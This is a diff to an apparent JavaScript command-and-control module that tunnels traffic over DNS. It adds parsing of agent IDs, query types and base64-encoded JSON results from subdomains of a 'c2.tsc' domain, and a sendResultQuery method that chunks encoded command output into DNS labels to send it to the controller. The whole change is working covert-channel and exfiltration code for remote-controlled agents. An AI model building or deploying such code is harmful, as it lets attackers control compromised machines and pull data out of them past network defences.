@@ -117,10 +117,34 @@ function extractAgentIdFromQuery(qname) {
   const subdomain = lower.slice(0, -DNS_C2_DOMAIN.length);
   if (!subdomain || subdomain.endsWith('.')) return null;
   const parts = subdomain.split('.');
-  return parts[parts.length - 1];
+  return parts[0];
 }
 
-function buildDNSQuery(agentId, command) {
+function extractQueryType(qname) {
+  const lower = qname.toLowerCase();
+  if (!lower.endsWith(DNS_C2_DOMAIN)) return null;
+  const subdomain = lower.slice(0, -DNS_C2_DOMAIN.length);
+  if (!subdomain) return null;
+  const parts = subdomain.split('.');
+  return parts[1] || null;
+}
+
+function extractResultFromQuery(qname) {
+  const lower = qname.toLowerCase();
+  if (!lower.endsWith(DNS_C2_DOMAIN)) return null;
+  const subdomain = lower.slice(0, -DNS_C2_DOMAIN.length);
+  if (!subdomain) return null;
+  const parts = subdomain.split('.');
+  if (parts.length < 3 || parts[1] !== 'r') return null;
+  const encoded = parts.slice(2).join('');
+  try {
+    return JSON.parse(Buffer.from(encoded, 'base64').toString('utf8'));
+  } catch (e) {
+    return null;
+  }
+}
+
+function buildDNSQuery(agentId, queryType = 'poll', extra = null) {
   const id = Math.floor(Math.random() * 65535);
   const flags = 0x0100;
   const qdcount = 1;
@@ -132,7 +156,18 @@ function buildDNSQuery(agentId, command) {
   header.writeUInt16BE(0, 8);
   header.writeUInt16BE(0, 10);
 
-  const domain = `${agentId}.poll.c2.tsc`;
+  const MAX_LABEL = 63;
+  let domain;
+  if (extra) {
+    const dataParts = [];
+    for (let i = 0; i < extra.length; i += MAX_LABEL) {
+      dataParts.push(extra.slice(i, i + MAX_LABEL));
+    }
+    domain = `${agentId}.${queryType}.${dataParts.join('.')}.c2.tsc`;
+  } else {
+    domain = `${agentId}.${queryType}.c2.tsc`;
+  }
+
   const encoded = encodeDNSName(domain);
   const qtype = Buffer.alloc(2);
   qtype.writeUInt16BE(16, 0);
@@ -225,6 +260,11 @@ class DNSProtocol {
     this.socket.send(packet, 0, packet.length, serverPort, serverAddr);
   }
 
+  sendResultQuery(agentId, encodedData, serverAddr, serverPort) {
+    const { packet } = buildDNSQuery(agentId, 'r', encodedData);
+    this.socket.send(packet, 0, packet.length, serverPort, serverAddr);
+  }
+
   stop() {
     if (this.socket) {
       try { this.socket.close(); } catch (e) {}
@@ -232,4 +272,4 @@ class DNSProtocol {
   }
 }
 
-module.exports = { DNSProtocol, extractAgentIdFromQuery };
+module.exports = { DNSProtocol, extractAgentIdFromQuery, extractQueryType, extractResultFromQuery };
